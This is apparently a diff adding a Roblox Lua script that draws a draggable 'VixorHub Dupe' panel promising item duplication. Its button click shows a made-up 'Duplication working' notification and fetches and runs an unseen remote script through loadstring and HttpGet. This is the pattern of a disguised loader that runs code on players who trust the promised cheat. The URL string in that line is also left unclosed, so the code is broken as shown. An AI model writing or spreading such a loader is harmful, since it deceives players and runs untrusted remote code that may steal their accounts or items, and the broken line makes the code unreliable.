@@ -1,0 +1,189 @@
+-- VixorHub Dupe GUI
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "VixorHubDupe"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create main frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 300, 0, 200)
+mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+mainFrame.BackgroundTransparency = 0.15
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+-- Add corner radius to main frame
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+-- Add outline stroke
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(70, 70, 70)
+stroke.Thickness = 2
+stroke.Parent = mainFrame
+
+-- Create title label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "TitleLabel"
+titleLabel.Size = UDim2.new(1, 0, 0, 50)
+titleLabel.Position = UDim2.new(0, 0, 0, 20)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "VixorHub Dupe"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.Parent = mainFrame
+
+-- Create dupe button
+local dupeButton = Instance.new("TextButton")
+dupeButton.Name = "DupeButton"
+dupeButton.Size = UDim2.new(0, 150, 0, 50)
+dupeButton.Position = UDim2.new(0.5, -75, 0.5, 10)
+dupeButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+dupeButton.BorderSizePixel = 0
+dupeButton.Text = "Dupe"
+dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+dupeButton.TextScaled = true
+dupeButton.Font = Enum.Font.GothamBold
+dupeButton.Parent = mainFrame
+
+-- Add corner radius to button
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = dupeButton
+
+-- Add button click functionality with notification and loadstring execution
+dupeButton.MouseButton1Click:Connect(function()
+	-- Change button color temporarily
+	dupeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+	-- Create Roblox-style notification
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "VixorHub Dupe";
+		Text = "Duplication working, teleporting you to low server";
+		Duration = 5;
+		Button1 = "OK";
+	})
+
+	-- Execute the loadstring script
+	pcall(function()
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/VixorHub/VixorHub-DupeGaG/refs/heads/main/VixorHub-DupeGaG.txt))()
+        end)
+
+	print("Dupe script executed!")
+
+	-- Reset button color after 1 second
+	wait(1)
+	dupeButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+end)
+
+-- Add hover effects
+dupeButton.MouseEnter:Connect(function()
+	dupeButton.BackgroundColor3 = Color3.fromRGB(30, 180, 255)
+end)
+
+dupeButton.MouseLeave:Connect(function()
+	dupeButton.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+end)
+
+-- Make the GUI draggable with ultra-smooth dragging
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local dragging
+local dragInput
+local dragStart
+local startPos
+local blurFrames = {}
+local dragConnection
+local blurCount = 0
+
+-- Create fewer motion blur frames for better performance
+for i = 1, 2 do
+	local blurFrame = mainFrame:Clone()
+	blurFrame.Name = "BlurFrame" .. i
+	blurFrame.BackgroundTransparency = 0.6 + (i * 0.2)
+	blurFrame.ZIndex = mainFrame.ZIndex - i
+	blurFrame.Visible = false
+	blurFrame.Parent = screenGui
+	table.insert(blurFrames, blurFrame)
+end
+
+local function createMotionBlur()
+	-- Only create blur every few frames to reduce lag
+	blurCount = blurCount + 1
+	if blurCount % 4 ~= 0 then return end
+
+	for i, blurFrame in pairs(blurFrames) do
+		blurFrame.Position = mainFrame.Position
+		blurFrame.Visible = true
+
+		-- Very fast blur animation
+		local tween = TweenService:Create(
+			blurFrame,
+			TweenInfo.new(0.08, Enum.EasingStyle.Linear),
+			{BackgroundTransparency = 1}
+		)
+		tween:Play()
+
+		tween.Completed:Connect(function()
+			blurFrame.Visible = false
+		end)
+	end
+end
+
+local function update()
+	if not dragInput or not dragging then return end
+
+	local delta = dragInput.Position - dragStart
+	local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+	-- Direct position update (no delays or throttling)
+	mainFrame.Position = newPos
+
+	-- Create motion blur less frequently
+	createMotionBlur()
+end
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+
+		-- Instant transparency change
+		mainFrame.BackgroundTransparency = 0.4
+
+		-- Use Heartbeat for smoother updates (less overhead than RenderStepped)
+		dragConnection = RunService.Heartbeat:Connect(update)
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+				if dragConnection then
+					dragConnection:Disconnect()
+					dragConnection = nil
+				end
+
+				-- Instant transparency reset (no tween for faster response)
+				mainFrame.BackgroundTransparency = 0.15
+				blurCount = 0
+			end
+		end)
+	end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
